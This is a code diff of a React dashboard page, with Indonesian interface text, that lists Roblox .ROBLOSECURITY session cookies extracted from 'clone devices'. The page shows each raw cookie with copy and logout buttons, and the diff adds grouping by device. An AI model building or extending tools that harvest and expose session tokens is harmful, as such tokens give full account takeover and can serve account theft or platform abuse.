@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useState, useCallback } from "react";
+import { useEffect, useState, useCallback, useMemo } from "react";
 
 interface CookieEntry {
   pkg: string;
@@ -24,6 +24,7 @@ function ago(ts?: number): string {
 
 export default function CookiesPage() {
   const [cookies, setCookies] = useState<CookieEntry[]>([]);
+  const [devices, setDevices] = useState<Record<string, string>>({});
   const [loading, setLoading] = useState(true);
   const [expanded, setExpanded] = useState<string | null>(null);
   const [copied, setCopied] = useState<string | null>(null);
@@ -35,7 +36,10 @@ export default function CookiesPage() {
     try {
       const res = await fetch("/api/device-control/cookies");
       const data = await res.json();
-      if (data.ok) setCookies(data.cookies || []);
+      if (data.ok) {
+        setCookies(data.cookies || []);
+        if (data.devices) setDevices(data.devices);
+      }
     } catch {}
     setLoading(false);
   }, []);
@@ -47,6 +51,20 @@ export default function CookiesPage() {
   }, [fetchCookies]);
 
   const entryKey = (c: CookieEntry) => c.deviceId ? `${c.deviceId}:${c.pkg}` : c.pkg;
+
+  const grouped = useMemo(() => {
+    const map: Record<string, CookieEntry[]> = {};
+    for (const c of cookies) {
+      const did = c.deviceId || "unknown";
+      if (!map[did]) map[did] = [];
+      map[did].push(c);
+    }
+    return Object.entries(map).sort((a, b) => {
+      const nameA = devices[a[0]] || a[0];
+      const nameB = devices[b[0]] || b[0];
+      return nameA.localeCompare(nameB);
+    });
+  }, [cookies, devices]);
 
   const toggle = (key: string) =>
     setExpanded((prev) => (prev === key ? null : key));
@@ -111,6 +129,24 @@ export default function CookiesPage() {
         }
         .ck-extract-btn:hover { background: #6d28d9; }
         .ck-extract-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .ck-device-group { margin-bottom: 24px; }
+        .ck-device-header {
+          display: flex; align-items: center; gap: 10px;
+          margin-bottom: 10px; padding-bottom: 8px;
+          border-bottom: 1px solid #2a2a3e;
+        }
+        .ck-device-name {
+          font-size: 1rem; font-weight: 700; color: #22d3ee;
+        }
+        .ck-device-id {
+          font-size: 0.7rem; color: #555; font-family: monospace;
+          background: #1a1a2e; padding: 2px 8px; border-radius: 4px;
+        }
+        .ck-device-count {
+          font-size: 0.7rem; color: #666; margin-left: auto;
+        }
+
         .ck-grid {
           display: grid;
           grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
@@ -133,11 +169,6 @@ export default function CookiesPage() {
         .ck-badge-out { background: #dc262622; color: #f87171; }
         .ck-row2 { display: flex; align-items: center; justify-content: space-between; margin-top: 4px; }
         .ck-pkg-label { color: #555; font-size: 0.7rem; font-family: monospace; }
-        .ck-meta { display: flex; align-items: center; gap: 8px; }
-        .ck-device-tag {
-          background: #222; color: #888; font-size: 0.65rem; padding: 1px 6px;
-          border-radius: 4px; font-family: monospace;
-        }
         .ck-time-tag { color: #555; font-size: 0.65rem; }
         .ck-body { padding: 0 14px 12px; border-top: 1px solid #2a2a3e; }
         .ck-label { color: #666; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.05em; margin: 10px 0 6px; }
@@ -177,7 +208,11 @@ export default function CookiesPage() {
         <h1>Cookies</h1>
         <p className="subtitle">.ROBLOSECURITY cookies dari clone devices</p>
         <div className="ck-top">
-          <span className="ck-count">{!loading && cookies.length > 0 ? `${cookies.length} akun` : ""}</span>
+          <span className="ck-count">
+            {!loading && cookies.length > 0
+              ? `${cookies.length} akun · ${grouped.length} device`
+              : ""}
+          </span>
           <button
             className="ck-extract-btn"
             onClick={triggerExtract}
@@ -191,73 +226,82 @@ export default function CookiesPage() {
           <div className="ck-empty">Loading...</div>
         ) : cookies.length === 0 ? (
           <div className="ck-empty">
-            Belum ada cookies. Klik "Extract Cookies" untuk ambil dari device.
+            Belum ada cookies. Klik &quot;Extract Cookies&quot; untuk ambil dari device.
           </div>
         ) : (
-          <div className="ck-grid">
-            {cookies.map((c) => {
-              const ck = entryKey(c);
-              const isOpen = expanded === ck;
-              const result = logoutResult[ck];
-              return (
-                <div
-                  className={`ck-card ${isOpen ? "active" : ""} ${c.loggedOut ? "logged-out" : ""}`}
-                  key={ck}
-                  onClick={() => !isOpen && toggle(ck)}
-                >
-                  <div className="ck-header">
-                    <div className="ck-header-top">
-                      <span className="ck-username">{c.username || c.pkg.replace("com.roblox.", "")}</span>
-                      <span className={`ck-badge ${c.loggedOut ? "ck-badge-out" : "ck-badge-active"}`}>
-                        {c.loggedOut ? "Logged Out" : "Active"}
-                      </span>
-                    </div>
-                    <div className="ck-row2">
-                      <span className="ck-pkg-label">{c.pkg.replace("com.roblox.", "")}</span>
-                      <div className="ck-meta">
-                        <span className="ck-device-tag">{c.deviceId?.substring(0, 8)}</span>
-                        <span className="ck-time-tag">{ago(c.updatedAt)}</span>
-                      </div>
-                    </div>
-                  </div>
-                  {isOpen && (
-                    <div className="ck-body">
-                      <div className="ck-label">Cookie</div>
-                      <div className="ck-cookie-box">{c.cookie}</div>
-                      <div className="ck-actions">
-                        <button
-                          className={`ck-copy-btn ${copied === ck ? "copied" : ""}`}
-                          onClick={(e) => { e.stopPropagation(); copyToClip(c.cookie, ck); }}
-                        >
-                          {copied === ck ? "Copied!" : "Copy Cookie"}
-                        </button>
-                        {!c.loggedOut && (
-                          <button
-                            className="ck-logout-btn"
-                            disabled={loggingOut === ck}
-                            onClick={(e) => { e.stopPropagation(); handleLogout(c); }}
-                          >
-                            {loggingOut === ck ? "Logging out..." : "Logout Session"}
-                          </button>
-                        )}
-                        <button
-                          className="ck-close-btn"
-                          onClick={(e) => { e.stopPropagation(); setExpanded(null); }}
-                        >
-                          Close
-                        </button>
-                      </div>
-                      {result && (
-                        <div className={`ck-result ${result.ok ? "ck-result-ok" : "ck-result-fail"}`}>
-                          {result.msg}
-                        </div>
-                      )}
-                    </div>
-                  )}
+          grouped.map(([deviceId, entries]) => {
+            const deviceName = devices[deviceId] || deviceId.substring(0, 8);
+            return (
+              <div key={deviceId} className="ck-device-group">
+                <div className="ck-device-header">
+                  <span className="ck-device-name">{deviceName}</span>
+                  <span className="ck-device-id">{deviceId.substring(0, 8)}</span>
+                  <span className="ck-device-count">{entries.length} akun</span>
                 </div>
-              );
-            })}
-          </div>
+                <div className="ck-grid">
+                  {entries.map((c) => {
+                    const ck = entryKey(c);
+                    const isOpen = expanded === ck;
+                    const result = logoutResult[ck];
+                    return (
+                      <div
+                        className={`ck-card ${isOpen ? "active" : ""} ${c.loggedOut ? "logged-out" : ""}`}
+                        key={ck}
+                        onClick={() => !isOpen && toggle(ck)}
+                      >
+                        <div className="ck-header">
+                          <div className="ck-header-top">
+                            <span className="ck-username">{c.username || c.pkg.replace("com.roblox.", "")}</span>
+                            <span className={`ck-badge ${c.loggedOut ? "ck-badge-out" : "ck-badge-active"}`}>
+                              {c.loggedOut ? "Logged Out" : "Active"}
+                            </span>
+                          </div>
+                          <div className="ck-row2">
+                            <span className="ck-pkg-label">{c.pkg.replace("com.roblox.", "")}</span>
+                            <span className="ck-time-tag">{ago(c.updatedAt)}</span>
+                          </div>
+                        </div>
+                        {isOpen && (
+                          <div className="ck-body">
+                            <div className="ck-label">Cookie</div>
+                            <div className="ck-cookie-box">{c.cookie}</div>
+                            <div className="ck-actions">
+                              <button
+                                className={`ck-copy-btn ${copied === ck ? "copied" : ""}`}
+                                onClick={(e) => { e.stopPropagation(); copyToClip(c.cookie, ck); }}
+                              >
+                                {copied === ck ? "Copied!" : "Copy Cookie"}
+                              </button>
+                              {!c.loggedOut && (
+                                <button
+                                  className="ck-logout-btn"
+                                  disabled={loggingOut === ck}
+                                  onClick={(e) => { e.stopPropagation(); handleLogout(c); }}
+                                >
+                                  {loggingOut === ck ? "Logging out..." : "Logout Session"}
+                                </button>
+                              )}
+                              <button
+                                className="ck-close-btn"
+                                onClick={(e) => { e.stopPropagation(); setExpanded(null); }}
+                              >
+                                Close
+                              </button>
+                            </div>
+                            {result && (
+                              <div className={`ck-result ${result.ok ? "ck-result-ok" : "ck-result-fail"}`}>
+                                {result.msg}
+                              </div>
+                            )}
+                          </div>
+                        )}
+                      </div>
+                    );
+                  })}
+                </div>
+              </div>
+            );
+          })
         )}
       </div>
     </div>
